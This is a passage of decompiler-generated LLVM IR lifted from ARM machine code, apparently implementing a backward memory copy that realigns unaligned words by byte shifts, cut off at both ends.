  %v4_11304 = inttoptr i32 %v3_11304 to i8*
  store i8 %v3_11300, i8* %v4_11304, align 1
  %v5_11304 = load i32, i32* %r0.global-to-local, align 4
  %v6_11304 = add i32 %v5_11304, -1
  store i32 %v6_11304, i32* %r0.global-to-local, align 4
  %v0_11308 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_11308 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_11308 = xor i1 %v0_11308, %v1_11308
  br i1 %v2_11308, label %.thread, label %bb70

bb70:                                             ; preds = %bb69
  %v3_11308 = load i32, i32* %r1.global-to-local, align 4
  %v4_11308 = add i32 %v3_11308, -1
  %v5_11308 = inttoptr i32 %v4_11308 to i8*
  %v6_11308 = load i8, i8* %v5_11308, align 1
  %v7_11308 = zext i8 %v6_11308 to i32
  store i32 %v7_11308, i32* %r3.global-to-local, align 4
  store i32 %v4_11308, i32* %r1.global-to-local, align 4
  %v6_1130c = add i32 %v5_11304, -2
  %v7_1130c = inttoptr i32 %v6_1130c to i8*
  store i8 %v6_11308, i8* %v7_1130c, align 1
  %v8_1130c = load i32, i32* %r0.global-to-local, align 4
  %v9_1130c = add i32 %v8_1130c, -1
  store i32 %v9_1130c, i32* %r0.global-to-local, align 4
  %v1_11310.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_11310.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread

.thread:                                          ; preds = %bb69, %bb70
  %v7_11314 = phi i32 [ %v9_1130c, %bb70 ], [ %v6_11304, %bb69 ]
  %v2_11314 = phi i1 [ %v2_11310.pre, %bb70 ], [ %v1_11308, %bb69 ]
  %v1_11314 = phi i1 [ %v1_11310.pre, %bb70 ], [ %v0_11308, %bb69 ]
  %v0_11310 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_11310 = xor i1 %v2_11314, %v1_11314
  %v4_11310 = or i1 %v0_11310, %v3_11310
  br i1 %v4_11310, label %.thread62, label %bb71

bb71:                                             ; preds = %.thread
  %v5_11310 = load i32, i32* %r1.global-to-local, align 4
  %v6_11310 = add i32 %v5_11310, -1
  %v7_11310 = inttoptr i32 %v6_11310 to i8*
  %v8_11310 = load i8, i8* %v7_11310, align 1
  %v9_11310 = zext i8 %v8_11310 to i32
  store i32 %v9_11310, i32* %r3.global-to-local, align 4
  store i32 %v6_11310, i32* %r1.global-to-local, align 4
  %v8_11314 = add i32 %v7_11314, -1
  %v9_11314 = inttoptr i32 %v8_11314 to i8*
  store i8 %v8_11310, i8* %v9_11314, align 1
  %v10_11314 = load i32, i32* %r0.global-to-local, align 4
  %v11_11314 = add i32 %v10_11314, -1
  store i32 %v11_11314, i32* %r0.global-to-local, align 4
  br label %.thread62

dec_label_pc_1131c:                               ; preds = %dec_label_pc_11274
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1131c = icmp eq i32 %v1_11274, 1
  store i1 %v8_1131c, i1* %cpsr_n.global-to-local, align 1
  %v9_1131c = icmp eq i32 %v1_11274, 2
  store i1 %v9_1131c, i1* %cpsr_z.global-to-local, align 1
  %v1_11320 = add i32 %v2_11264, -1
  %v2_11320 = inttoptr i32 %v1_11320 to i8*
  %v3_11320 = load i8, i8* %v2_11320, align 1
  %v4_11320 = zext i8 %v3_11320 to i32
  store i32 %v4_11320, i32* %r3.global-to-local, align 4
  store i32 %v1_11320, i32* %r1.global-to-local, align 4
  %v3_11324 = add i32 %v2_11268, -1
  %v4_11324 = inttoptr i32 %v3_11324 to i8*
  store i8 %v3_11320, i8* %v4_11324, align 1
  %v5_11324 = load i32, i32* %r0.global-to-local, align 4
  %v6_11324 = add i32 %v5_11324, -1
  store i32 %v6_11324, i32* %r0.global-to-local, align 4
  br i1 %v8_1131c, label %.thread13, label %bb72

bb72:                                             ; preds = %dec_label_pc_1131c
  %v6_11328 = load i32, i32* %r1.global-to-local, align 4
  %v7_11328 = add i32 %v6_11328, -1
  %v8_11328 = inttoptr i32 %v7_11328 to i8*
  %v9_11328 = load i8, i8* %v8_11328, align 1
  %v10_11328 = zext i8 %v9_11328 to i32
  store i32 %v10_11328, i32* %r3.global-to-local, align 4
  store i32 %v7_11328, i32* %r1.global-to-local, align 4
  %v9_1132c = add i32 %v5_11324, -2
  %v10_1132c = inttoptr i32 %v9_1132c to i8*
  store i8 %v9_11328, i8* %v10_1132c, align 1
  %v11_1132c = load i32, i32* %r0.global-to-local, align 4
  %v12_1132c = add i32 %v11_1132c, -1
  store i32 %v12_1132c, i32* %r0.global-to-local, align 4
  br i1 %v9_1131c, label %.thread13, label %bb73

bb73:                                             ; preds = %bb72
  %v8_11330 = load i32, i32* %r1.global-to-local, align 4
  %v9_11330 = add i32 %v8_11330, -1
  %v10_11330 = inttoptr i32 %v9_11330 to i8*
  %v11_11330 = load i8, i8* %v10_11330, align 1
  %v12_11330 = zext i8 %v11_11330 to i32
  store i32 %v12_11330, i32* %r3.global-to-local, align 4
  store i32 %v9_11330, i32* %r1.global-to-local, align 4
  %v11_11334 = add i32 %v11_1132c, -2
  %v12_11334 = inttoptr i32 %v11_11334 to i8*
  store i8 %v11_11330, i8* %v12_11334, align 1
  %v13_11334 = load i32, i32* %r0.global-to-local, align 4
  %v14_11334 = add i32 %v13_11334, -1
  store i32 %v14_11334, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb72, %dec_label_pc_1131c, %bb73
  %v0_1139024 = phi i32 [ %v12_1132c, %bb72 ], [ %v6_11324, %dec_label_pc_1131c ], [ %v14_11334, %bb73 ]
  %v0_11338 = load i32, i32* %r2.global-to-local, align 4
  %v1_11338 = load i32, i32* %ip.global-to-local, align 4
  %v2_11338 = sub i32 %v0_11338, %v1_11338
  store i32 %v2_11338, i32* %r2.global-to-local, align 4
  %v4_11338 = xor i32 %v1_11338, %v0_11338
  %v5_11338 = xor i32 %v2_11338, %v0_11338
  %v6_11338 = and i32 %v5_11338, %v4_11338
  %v7_11338 = icmp slt i32 %v6_11338, 0
  store i1 %v7_11338, i1* %cpsr_v.global-to-local, align 1
  %v8_11338 = icmp slt i32 %v2_11338, 0
  store i1 %v8_11338, i1* %cpsr_n.global-to-local, align 1
  %v9_11338 = icmp eq i32 %v0_11338, %v1_11338
  store i1 %v9_11338, i1* %cpsr_z.global-to-local, align 1
  %v5_1133c = icmp slt i32 %v0_11338, %v1_11338
  br i1 %v5_1133c, label %bb68, label %dec_label_pc_11340

dec_label_pc_11340:                               ; preds = %.thread13
  %v0_11340 = load i32, i32* %r1.global-to-local, align 4
  %v1_11340 = urem i32 %v0_11340, 4
  store i32 %v1_11340, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11340 = icmp eq i32 %v1_11340, 0
  store i1 %v2_11340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11340, label %dec_label_pc_11284, label %dec_label_pc_11348

dec_label_pc_11348:                               ; preds = %dec_label_pc_1127c, %dec_label_pc_11340
  %v0_1139023 = phi i32 [ %v2_11268, %dec_label_pc_1127c ], [ %v0_1139024, %dec_label_pc_11340 ]
  %v0_1143c = phi i32 [ %v2_1126c, %dec_label_pc_1127c ], [ %v2_11338, %dec_label_pc_11340 ]
  %v0_11348 = phi i32 [ %v2_11264, %dec_label_pc_1127c ], [ %v0_11340, %dec_label_pc_11340 ]
  %v0_11350 = phi i32 [ %v1_1127c, %dec_label_pc_1127c ], [ %v1_11340, %dec_label_pc_11340 ]
  %v1_11348 = and i32 %v0_11348, -4
  store i32 %v1_11348, i32* %r1.global-to-local, align 4
  %v1_1134c = inttoptr i32 %v1_11348 to i32*
  %v2_1134c = load i32, i32* %v1_1134c, align 4
  store i32 %v2_1134c, i32* %r3.global-to-local, align 4
  %v7_11350 = icmp ult i32 %v0_11350, 2
  %v2_11434 = add i32 %v0_1143c, -12
  %v4_11434 = sub i32 11, %v0_1143c
  %v5_11434 = and i32 %v4_11434, %v0_1143c
  %v6_11434 = icmp slt i32 %v5_11434, 0
  store i1 %v6_11434, i1* %cpsr_v.global-to-local, align 1
  %v7_11434 = icmp slt i32 %v2_11434, 0
  store i1 %v7_11434, i1* %cpsr_n.global-to-local, align 1
  %v8_11434 = icmp eq i32 %v0_1143c, 12
  store i1 %v8_11434, i1* %cpsr_z.global-to-local, align 1
  %v5_11438 = icmp slt i32 %v0_1143c, 12
  br i1 %v7_11350, label %dec_label_pc_11434, label %dec_label_pc_11358

dec_label_pc_11358:                               ; preds = %dec_label_pc_11348
  %v8_11350 = icmp eq i32 %v0_11350, 2
  br i1 %v8_11350, label %dec_label_pc_113c8, label %dec_label_pc_1135c

dec_label_pc_1135c:                               ; preds = %dec_label_pc_11358
  br i1 %v5_11438, label %dec_label_pc_113a8, label %dec_label_pc_11364

dec_label_pc_11364:                               ; preds = %dec_label_pc_1135c
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  %v3_11368 = load i32, i32* @r4, align 4
  store i32 %v3_11368, i32* %stack_var_-12, align 4
  %v6_11368 = load i32, i32* @r5, align 4
  store i32 %v6_11368, i32* %stack_var_-8, align 4
  %v9_11368 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1136c

dec_label_pc_1136c:                               ; preds = %dec_label_pc_1136c.dec_label_pc_1136c_crit_edge, %dec_label_pc_11364
  %v0_11390 = phi i32 [ %v1_11390, %dec_label_pc_1136c.dec_label_pc_1136c_crit_edge ], [ %v0_1139023, %dec_label_pc_11364 ]
  %v0_11370 = phi i32 [ %v0_11370.pre, %dec_label_pc_1136c.dec_label_pc_1136c_crit_edge ], [ %v1_11348, %dec_label_pc_11364 ]
  %v0_1136c = phi i32 [ %v0_1136c.pre, %dec_label_pc_1136c.dec_label_pc_1136c_crit_edge ], [ %v2_1134c, %dec_label_pc_11364 ]
  %v3_1136c = mul i32 %v0_1136c, 256
  store i32 %v3_1136c, i32* %lr.global-to-local, align 4
  %v1_11370 = add i32 %v0_11370, -4
  %v2_11370 = inttoptr i32 %v1_11370 to i32*
  %v3_11370 = load i32, i32* %v2_11370, align 4
  store i32 %v3_11370, i32* %r3.global-to-local, align 4
  %v4_11370 = add i32 %v0_11370, -8
  %v5_11370 = inttoptr i32 %v4_11370 to i32*
  %v6_11370 = load i32, i32* %v5_11370, align 4
  store i32 %v6_11370, i32* %r4.global-to-local, align 4
  %v7_11370 = add i32 %v0_11370, -12
  %v8_11370 = inttoptr i32 %v7_11370 to i32*
  %v9_11370 = load i32, i32* %v8_11370, align 4
  store i32 %v9_11370, i32* %r5.global-to-local, align 4
  %v10_11370 = add i32 %v0_11370, -16
  %v11_11370 = inttoptr i32 %v10_11370 to i32*
  %v12_11370 = load i32, i32* %v11_11370, align 4
  store i32 %v10_11370, i32* %r1.global-to-local, align 4
  %v4_11374 = udiv i32 %v12_11370, 16777216
  %v5_11374 = or i32 %v4_11374, %v3_1136c
  store i32 %v5_11374, i32* %lr.global-to-local, align 4
  %v3_11378 = mul i32 %v12_11370, 256
  %v4_1137c = udiv i32 %v9_11370, 16777216
  %v5_1137c = or i32 %v3_11378, %v4_1137c
  store i32 %v5_1137c, i32* %ip.global-to-local, align 4
  %v3_11380 = mul i32 %v9_11370, 256
  %v4_11384 = udiv i32 %v6_11370, 16777216
  %v5_11384 = or i32 %v3_11380, %v4_11384
  store i32 %v5_11384, i32* %r5.global-to-local, align 4
  %v3_11388 = mul i32 %v6_11370, 256
  %v4_1138c = udiv i32 %v3_11370, 16777216
  %v5_1138c = or i32 %v3_11388, %v4_1138c
  store i32 %v5_1138c, i32* %r4.global-to-local, align 4
  %v1_11390 = add i32 %v0_11390, -16
  %v2_11390 = inttoptr i32 %v1_11390 to i32*
  store i32 %v5_1138c, i32* %v2_11390, align 4
  %v4_11390 = add i32 %v0_11390, -12
  %v5_11390 = inttoptr i32 %v4_11390 to i32*
  %v6_11390 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_11390, i32* %v5_11390, align 4
  %v7_11390 = add i32 %v0_11390, -8
  %v8_11390 = inttoptr i32 %v7_11390 to i32*
  %v9_11390 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_11390, i32* %v8_11390, align 4
  %v10_11390 = add i32 %v0_11390, -4
  %v11_11390 = inttoptr i32 %v10_11390 to i32*
  %v12_11390 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_11390, i32* %v11_11390, align 4
  store i32 %v1_11390, i32* %r0.global-to-local, align 4
  %v0_11394 = load i32, i32* %r2.global-to-local, align 4
  %v2_11394 = add i32 %v0_11394, -16
  store i32 %v2_11394, i32* %r2.global-to-local, align 4
  %v6_11398 = icmp slt i32 %v0_11394, 16
  br i1 %v6_11398, label %dec_label_pc_1139c, label %dec_label_pc_1136c.dec_label_pc_1136c_crit_edge

dec_label_pc_1136c.dec_label_pc_1136c_crit_edge:  ; preds = %dec_label_pc_1136c
  %v0_1136c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_11370.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1136c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_1136c
  %v2_1139c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1139c, i32* %r4.global-to-local, align 4
  %v5_1139c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_1139c, i32* %r5.global-to-local, align 4
  store i32 %v9_11368, i32* %lr.global-to-local, align 4
  %v2_113a0 = add i32 %v0_11394, -4
  store i32 %v2_113a0, i32* %r2.global-to-local, align 4
  %v4_113a0 = add i32 %v0_11394, 2147483632
  %v5_113a0 = and i32 %v2_113a0, %v4_113a0
  %v6_113a0 = icmp slt i32 %v5_113a0, 0
  store i1 %v6_113a0, i1* %cpsr_v.global-to-local, align 1
  %v7_113a0 = icmp slt i32 %v2_113a0, 0
  store i1 %v7_113a0, i1* %cpsr_n.global-to-local, align 1
  %v8_113a0 = icmp eq i32 %v2_113a0, 0
  store i1 %v8_113a0, i1* %cpsr_z.global-to-local, align 1
  %v5_113a4 = icmp slt i32 %v2_11394, -12
  br i1 %v5_113a4, label %dec_label_pc_113c0, label %dec_label_pc_113a8

dec_label_pc_113a8:                               ; preds = %dec_label_pc_1139c, %dec_label_pc_1135c, %dec_label_pc_113a8
  %v1_113b4 = phi i32 [ %v5_113b4, %dec_label_pc_113a8 ], [ %v1_11390, %dec_label_pc_1139c ], [ %v0_1139023, %dec_label_pc_1135c ]
  %v0_113a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_113a8 = mul i32 %v0_113a8, 256
  store i32 %v3_113a8, i32* %ip.global-to-local, align 4
  %v0_113ac = load i32, i32* %r1.global-to-local, align 4
  %v1_113ac = add i32 %v0_113ac, -4
  %v2_113ac = inttoptr i32 %v1_113ac to i32*
  %v3_113ac = load i32, i32* %v2_113ac, align 4
  store i32 %v3_113ac, i32* %r3.global-to-local, align 4
  store i32 %v1_113ac, i32* %r1.global-to-local, align 4
  %v4_113b0 = udiv i32 %v3_113ac, 16777216
  %v5_113b0 = or i32 %v4_113b0, %v3_113a8
  store i32 %v5_113b0, i32* %ip.global-to-local, align 4
  %v2_113b4 = add i32 %v1_113b4, -4
  %v3_113b4 = inttoptr i32 %v2_113b4 to i32*
  store i32 %v5_113b0, i32* %v3_113b4, align 4
  %v4_113b4 = load i32, i32* %r0.global-to-local, align 4
  %v5_113b4 = add i32 %v4_113b4, -4
  store i32 %v5_113b4, i32* %r0.global-to-local, align 4
  %v0_113b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_113b8 = add i32 %v0_113b8, -4
  store i32 %v2_113b8, i32* %r2.global-to-local, align 4
  %v6_113bc = icmp slt i32 %v0_113b8, 4
  br i1 %v6_113bc, label %dec_label_pc_113c0.loopexit, label %dec_label_pc_113a8

dec_label_pc_113c0.loopexit:                      ; preds = %dec_label_pc_113a8
  %v4_113b8 = sub i32 3, %v0_113b8
  %v5_113b8 = and i32 %v4_113b8, %v0_113b8
  %v6_113b8 = icmp slt i32 %v5_113b8, 0
  %v7_113b8 = icmp slt i32 %v2_113b8, 0
  store i1 %v6_113b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_113b8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %dec_label_pc_113c0.loopexit, %dec_label_pc_1139c
  %v2_1130455 = phi i32 [ %v5_113b4, %dec_label_pc_113c0.loopexit ], [ %v1_11390, %dec_label_pc_1139c ]
  %v0_112f451 = phi i32 [ %v2_113b8, %dec_label_pc_113c0.loopexit ], [ %v2_113a0, %dec_label_pc_1139c ]
  %v0_113c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_113c0 = add i32 %v0_113c0, 3
  store i32 %v1_113c0, i32* %r1.global-to-local, align 4
  br label %bb68

dec_label_pc_113c8:                               ; preds = %dec_label_pc_11358
  br i1 %v5_11438, label %dec_label_pc_11414, label %dec_label_pc_113d0

dec_label_pc_113d0:                               ; preds = %dec_label_pc_113c8
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  %v3_113d4 = load i32, i32* @r4, align 4
  store i32 %v3_113d4, i32* %stack_var_-12, align 4
  %v6_113d4 = load i32, i32* @r5, align 4
  store i32 %v6_113d4, i32* %stack_var_-8, align 4
  %v9_113d4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_113d8

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113d8.dec_label_pc_113d8_crit_edge, %dec_label_pc_113d0
  %v0_113fc = phi i32 [ %v1_113fc, %dec_label_pc_113d8.dec_label_pc_113d8_crit_edge ], [ %v0_1139023, %dec_label_pc_113d0 ]
  %v0_113dc = phi i32 [ %v0_113dc.pre, %dec_label_pc_113d8.dec_label_pc_113d8_crit_edge ], [ %v1_11348, %dec_label_pc_113d0 ]
  %v0_113d8 = phi i32 [ %v0_113d8.pre, %dec_label_pc_113d8.dec_label_pc_113d8_crit_edge ], [ %v2_1134c, %dec_label_pc_113d0 ]
  %v3_113d8 = mul i32 %v0_113d8, 65536
  store i32 %v3_113d8, i32* %lr.global-to-local, align 4
  %v1_113dc = add i32 %v0_113dc, -4
  %v2_113dc = inttoptr i32 %v1_113dc to i32*
  %v3_113dc = load i32, i32* %v2_113dc, align 4
  store i32 %v3_113dc, i32* %r3.global-to-local, align 4
  %v4_113dc = add i32 %v0_113dc, -8
  %v5_113dc = inttoptr i32 %v4_113dc to i32*
  %v6_113dc = load i32, i32* %v5_113dc, align 4
  store i32 %v6_113dc, i32* %r4.global-to-local, align 4
  %v7_113dc = add i32 %v0_113dc, -12
  %v8_113dc = inttoptr i32 %v7_113dc to i32*
  %v9_113dc = load i32, i32* %v8_113dc, align 4
  store i32 %v9_113dc, i32* %r5.global-to-local, align 4
  %v10_113dc = add i32 %v0_113dc, -16
  %v11_113dc = inttoptr i32 %v10_113dc to i32*
  %v12_113dc = load i32, i32* %v11_113dc, align 4
  store i32 %v10_113dc, i32* %r1.global-to-local, align 4
  %v4_113e0 = udiv i32 %v12_113dc, 65536
  %v5_113e0 = or i32 %v4_113e0, %v3_113d8
  store i32 %v5_113e0, i32* %lr.global-to-local, align 4
  %v3_113e4 = mul i32 %v12_113dc, 65536
  %v4_113e8 = udiv i32 %v9_113dc, 65536
  %v5_113e8 = or i32 %v3_113e4, %v4_113e8
  store i32 %v5_113e8, i32* %ip.global-to-local, align 4
  %v3_113ec = mul i32 %v9_113dc, 65536
  %v4_113f0 = udiv i32 %v6_113dc, 65536
  %v5_113f0 = or i32 %v3_113ec, %v4_113f0
  store i32 %v5_113f0, i32* %r5.global-to-local, align 4
  %v3_113f4 = mul i32 %v6_113dc, 65536
  %v4_113f8 = udiv i32 %v3_113dc, 65536
  %v5_113f8 = or i32 %v3_113f4, %v4_113f8
  store i32 %v5_113f8, i32* %r4.global-to-local, align 4
  %v1_113fc = add i32 %v0_113fc, -16
  %v2_113fc = inttoptr i32 %v1_113fc to i32*
  store i32 %v5_113f8, i32* %v2_113fc, align 4
  %v4_113fc = add i32 %v0_113fc, -12
  %v5_113fc = inttoptr i32 %v4_113fc to i32*
  %v6_113fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_113fc, i32* %v5_113fc, align 4
  %v7_113fc = add i32 %v0_113fc, -8
  %v8_113fc = inttoptr i32 %v7_113fc to i32*
  %v9_113fc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_113fc, i32* %v8_113fc, align 4
  %v10_113fc = add i32 %v0_113fc, -4
  %v11_113fc = inttoptr i32 %v10_113fc to i32*
  %v12_113fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_113fc, i32* %v11_113fc, align 4
  store i32 %v1_113fc, i32* %r0.global-to-local, align 4
  %v0_11400 = load i32, i32* %r2.global-to-local, align 4
  %v2_11400 = add i32 %v0_11400, -16
  store i32 %v2_11400, i32* %r2.global-to-local, align 4
  %v6_11404 = icmp slt i32 %v0_11400, 16
  br i1 %v6_11404, label %dec_label_pc_11408, label %dec_label_pc_113d8.dec_label_pc_113d8_crit_edge

dec_label_pc_113d8.dec_label_pc_113d8_crit_edge:  ; preds = %dec_label_pc_113d8
  %v0_113d8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_113dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_113d8

dec_label_pc_11408:                               ; preds = %dec_label_pc_113d8
  %v2_11408 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11408, i32* %r4.global-to-local, align 4
  %v5_11408 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_11408, i32* %r5.global-to-local, align 4
  store i32 %v9_113d4, i32* %lr.global-to-local, align 4
  %v2_1140c = add i32 %v0_11400, -4
  store i32 %v2_1140c, i32* %r2.global-to-local, align 4
  %v4_1140c = add i32 %v0_11400, 2147483632
  %v5_1140c = and i32 %v2_1140c, %v4_1140c
  %v6_1140c = icmp slt i32 %v5_1140c, 0
  store i1 %v6_1140c, i1* %cpsr_v.global-to-local, align 1
  %v7_1140c = icmp slt i32 %v2_1140c, 0
  store i1 %v7_1140c, i1* %cpsr_n.global-to-local, align 1
  %v8_1140c = icmp eq i32 %v2_1140c, 0
  store i1 %v8_1140c, i1* %cpsr_z.global-to-local, align 1
  %v5_11410 = icmp slt i32 %v2_11400, -12
  br i1 %v5_11410, label %dec_label_pc_1142c, label %dec_label_pc_11414

dec_label_pc_11414:                               ; preds = %dec_label_pc_11408, %dec_label_pc_113c8, %dec_label_pc_11414
  %v1_11420 = phi i32 [ %v5_11420, %dec_label_pc_11414 ], [ %v1_113fc, %dec_label_pc_11408 ], [ %v0_1139023, %dec_label_pc_113c8 ]
  %v0_11414 = load i32, i32* %r3.global-to-local, align 4
  %v3_11414 = mul i32 %v0_11414, 65536
  store i32 %v3_11414, i32* %ip.global-to-local, align 4
  %v0_11418 = load i32, i32* %r1.global-to-local, align 4
  %v1_11418 = add i32 %v0_11418, -4
  %v2_11418 = inttoptr i32 %v1_11418 to i32*
  %v3_11418 = load i32, i32* %v2_11418, align 4
  store i32 %v3_11418, i32* %r3.global-to-local, align 4
  store i32 %v1_11418, i32* %r1.global-to-local, align 4
  %v4_1141c = udiv i32 %v3_11418, 65536
  %v5_1141c = or i32 %v4_1141c, %v3_11414
  store i32 %v5_1141c, i32* %ip.global-to-local, align 4
  %v2_11420 = add i32 %v1_11420, -4
  %v3_11420 = inttoptr i32 %v2_11420 to i32*
  store i32 %v5_1141c, i32* %v3_11420, align 4
  %v4_11420 = load i32, i32* %r0.global-to-local, align 4
  %v5_11420 = add i32 %v4_11420, -4
  store i32 %v5_11420, i32* %r0.global-to-local, align 4
  %v0_11424 = load i32, i32* %r2.global-to-local, align 4
  %v2_11424 = add i32 %v0_11424, -4
  store i32 %v2_11424, i32* %r2.global-to-local, align 4
  %v6_11428 = icmp slt i32 %v0_11424, 4
  br i1 %v6_11428, label %dec_label_pc_1142c.loopexit, label %dec_label_pc_11414

dec_label_pc_1142c.loopexit:                      ; preds = %dec_label_pc_11414
  %v4_11424 = sub i32 3, %v0_11424
  %v5_11424 = and i32 %v4_11424, %v0_11424
  %v6_11424 = icmp slt i32 %v5_11424, 0
  %v7_11424 = icmp slt i32 %v2_11424, 0
  store i1 %v6_11424, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_11424, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1142c

dec_label_pc_1142c:                               ; preds = %dec_label_pc_1142c.loopexit, %dec_label_pc_11408
  %v2_1130456 = phi i32 [ %v5_11420, %dec_label_pc_1142c.loopexit ], [ %v1_113fc, %dec_label_pc_11408 ]
  %v0_112f452 = phi i32 [ %v2_11424, %dec_label_pc_1142c.loopexit ], [ %v2_1140c, %dec_label_pc_11408 ]
  %v0_1142c = load i32, i32* %r1.global-to-local, align 4
  %v1_1142c = add i32 %v0_1142c, 2
  store i32 %v1_1142c, i32* %r1.global-to-local, align 4
  br label %bb68

dec_label_pc_11434:                               ; preds = %dec_label_pc_11348
  br i1 %v5_11438, label %dec_label_pc_11480, label %dec_label_pc_1143c

dec_label_pc_1143c:                               ; preds = %dec_label_pc_11434
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  %v3_11440 = load i32, i32* @r4, align 4
  store i32 %v3_11440, i32* %stack_var_-12, align 4
  %v6_11440 = load i32, i32* @r5, align 4
  store i32 %v6_11440, i32* %stack_var_-8, align 4
  %v9_11440 = load i32, i32* @lr, align 4
  br label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %dec_label_pc_11444.dec_label_pc_11444_crit_edge, %dec_label_pc_1143c
  %v0_11468 = phi i32 [ %v1_11468, %dec_label_pc_11444.dec_label_pc_11444_crit_edge ], [ %v0_1139023, %dec_label_pc_1143c ]
  %v0_11448 = phi i32 [ %v0_11448.pre, %dec_label_pc_11444.dec_label_pc_11444_crit_edge ], [ %v1_11348, %dec_label_pc_1143c ]
  %v0_11444 = phi i32 [ %v0_11444.pre, %dec_label_pc_11444.dec_label_pc_11444_crit_edge ], [ %v2_1134c, %dec_label_pc_1143c ]
  %v3_11444 = mul i32 %v0_11444, 16777216
  store i32 %v3_11444, i32* %lr.global-to-local, align 4
  %v1_11448 = add i32 %v0_11448, -4
  %v2_11448 = inttoptr i32 %v1_11448 to i32*
  %v3_11448 = load i32, i32* %v2_11448, align 4
  store i32 %v3_11448, i32* %r3.global-to-local, align 4
  %v4_11448 = add i32 %v0_11448, -8
  %v5_11448 = inttoptr i32 %v4_11448 to i32*
  %v6_11448 = load i32, i32* %v5_11448, align 4
  store i32 %v6_11448, i32* %r4.global-to-local, align 4
  %v7_11448 = add i32 %v0_11448, -12
  %v8_11448 = inttoptr i32 %v7_11448 to i32*
  %v9_11448 = load i32, i32* %v8_11448, align 4
  store i32 %v9_11448, i32* %r5.global-to-local, align 4
  %v10_11448 = add i32 %v0_11448, -16
  %v11_11448 = inttoptr i32 %v10_11448 to i32*
  %v12_11448 = load i32, i32* %v11_11448, align 4
  store i32 %v10_11448, i32* %r1.global-to-local, align 4
  %v4_1144c = udiv i32 %v12_11448, 256
  %v5_1144c = or i32 %v4_1144c, %v3_11444
  store i32 %v5_1144c, i32* %lr.global-to-local, align 4
  %v3_11450 = mul i32 %v12_11448, 16777216
  %v4_11454 = udiv i32 %v9_11448, 256
  %v5_11454 = or i32 %v3_11450, %v4_11454
  store i32 %v5_11454, i32* %ip.global-to-local, align 4
  %v3_11458 = mul i32 %v9_11448, 16777216
  %v4_1145c = udiv i32 %v6_11448, 256
  %v5_1145c = or i32 %v3_11458, %v4_1145c
  store i32 %v5_1145c, i32* %r5.global-to-local, align 4
  %v3_11460 = mul i32 %v6_11448, 16777216
  %v4_11464 = udiv i32 %v3_11448, 256
  %v5_11464 = or i32 %v3_11460, %v4_11464
  store i32 %v5_11464, i32* %r4.global-to-local, align 4
  %v1_11468 = add i32 %v0_11468, -16
  %v2_11468 = inttoptr i32 %v1_11468 to i32*
  store i32 %v5_11464, i32* %v2_11468, align 4
  %v4_11468 = add i32 %v0_11468, -12
  %v5_11468 = inttoptr i32 %v4_11468 to i32*
  %v6_11468 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_11468, i32* %v5_11468, align 4
  %v7_11468 = add i32 %v0_11468, -8
  %v8_11468 = inttoptr i32 %v7_11468 to i32*
  %v9_11468 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_11468, i32* %v8_11468, align 4
  %v10_11468 = add i32 %v0_11468, -4
  %v11_11468 = inttoptr i32 %v10_11468 to i32*
  %v12_11468 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_11468, i32* %v11_11468, align 4
  store i32 %v1_11468, i32* %r0.global-to-local, align 4
  %v0_1146c = load i32, i32* %r2.global-to-local, align 4
  %v2_1146c = add i32 %v0_1146c, -16
  store i32 %v2_1146c, i32* %r2.global-to-local, align 4
  %v6_11470 = icmp slt i32 %v0_1146c, 16
  br i1 %v6_11470, label %dec_label_pc_11474, label %dec_label_pc_11444.dec_label_pc_11444_crit_edge

dec_label_pc_11444.dec_label_pc_11444_crit_edge:  ; preds = %dec_label_pc_11444
  %v0_11444.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_11448.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11444

dec_label_pc_11474:                               ; preds = %dec_label_pc_11444
  %v2_11474 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11474, i32* %r4.global-to-local, align 4
  %v5_11474 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_11474, i32* %r5.global-to-local, align 4
  store i32 %v9_11440, i32* %lr.global-to-local, align 4
  %v2_11478 = add i32 %v0_1146c, -4
